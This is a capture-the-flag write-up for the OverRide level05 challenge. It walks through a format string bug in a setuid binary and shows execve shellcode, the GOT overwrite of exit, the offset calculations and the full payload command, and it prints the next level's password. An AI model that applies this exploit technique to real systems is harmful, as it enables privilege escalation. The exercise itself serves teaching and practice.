# 05 - Format string (2)
> README by [jchene](https://github.com/jchene)

We have a binary named level05 at /home/users/level05/

It is owned by `level06`, has a `setuid bit` and hax `NX` disabled

The program first defines some variables ask the user for a prompt

```c
int main(void)
{
    char string[100];
    unsigned int i;

    i = 0;
    fgets(string, 100, stdin);
```

Then the input is processed by a loop which performs a XOR operation on every input character contained between `A` (dec 65) and `Z` (dec 90)

```c
for (i = 0; i < strlen(string); ++i)
    {
        if (string[i] >= 'A' && string[i] <= 'Z')
            string[i] ^= 0b00100000;
    }
```

Finally, `printf` is called on the input and the programs quits using `exit`

```c
    printf(string);
    exit(0);
}
```

We can see a `format string` vulnerability on the printf but because the program exits using `exit` we won't return which means we can't override the return address of the `main` function

Let's start by finding another address that we can overwrite to jump in a shellcode

After disassembling the main function we can inspect the `exit` function

```
(gdb) disas main
   0x08048444 <+0>:     push   %ebp
   ...
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
End of assembler dump.
(gdb) x/i 0x8048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
```

We can see that the first instruction of `exit` is to jump on an address contained inside `0x80497e0` so by replacing the content of this address with the start of a shellcode we can exploit this binary file

```
(gdb) set *0x80497e0=0x42424242
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Now we have to find how to overwite the address using the `printf` vulnerability

Let's first display the stack to find the memory offset of the buffer
```
level05@OverRide:~$ echo -e "abcd%x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
abcd64 f7fcfac0 f7ec3add ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 64636261 25207825 78252078
```

We can see the buffer starting point at the 10th value (`64636261`) which are the hexadecimal values for `dcba`

Now we can overwrite the instruction by writing it's address inside the buffer then using `%n` to write at the address the value we need

Now we have to store a shellcode somewhere and write it's address inside the instruction

We will put the shellcode in an environment variable as such
```bash
export SHELLCODE=$(echo -ne "\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80")
```

This is the same simple shellcode that we already used in `level01` which only calls `execve(/bin//sh)`

Now we can use a small `c` program to get and print the address of the environment variable containing the shellcode

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char **argv){
    if (argc != 2)
        return 1;
    printf("%p\n", getenv(argv[1]));
    return 0;
}
```

We have to upload it and compile it on the machine using as much as possible the same flags than the `level05` binary
```bash
scp -P 42421 ./level05/Ressources/getEnvAddress.c level05@$WINIP:/tmp/getEnvAddress.c
```
```bash
gcc -m32 -z execstack -fno-stack-protector --no-pie -o /tmp/getEnvAddress /tmp/getEnvAddress.c

/tmp/getEnvAddress SHELLCODE
```
```
0xffffd8e4
```

Now we have to convert this address to two integers that we will write at the instruction jump

```
FFFF = 65535
D8E4 = 55524
```

Because we have already written 8 bytes of addresses we can substract 8 to the first value which becomes `55516` then we can substract `55524` to `65535` to get the missing value
```
65535 - 55524 = 10011
```

Now we have the full payload and we have to write it at the 10th and 11th offsets

First we print the two addresses
```
\xe0\x97\x04\x08\xe2\x97\x04\x08
```

Then we print the values (`55516` and `10011`) followed by the positions in the stack (`10` and `11`) two times
```
%55516x%10$n%10011x%11$n
```

Here is the full command
```bash
(echo -ne "\xe0\x97\x04\x08\xe2\x97\x04\x08%55516x%10\$n%10011x%11\$n"; cat) | ./level05
```

Let's try it
```
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

The flag is
```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
